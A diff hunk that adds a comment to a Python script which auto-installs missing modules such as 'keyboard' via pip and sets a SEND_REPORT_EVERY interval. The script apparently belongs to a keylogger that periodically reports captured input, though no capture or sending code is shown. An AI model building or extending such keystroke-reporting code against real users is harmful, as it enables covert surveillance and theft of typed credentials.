@@ -13,6 +13,7 @@ try:
     import tkinter
     from tkinter import messagebox
 except ModuleNotFoundError as exception:
+    # If a module is not installed, 'keyboard', the script will automatically install it.
     subprocess.check_call([sys.executable, "-m", "pip", "install", exception.name])
 
 SEND_REPORT_EVERY = 60 # means every '60' seconds, change as needed
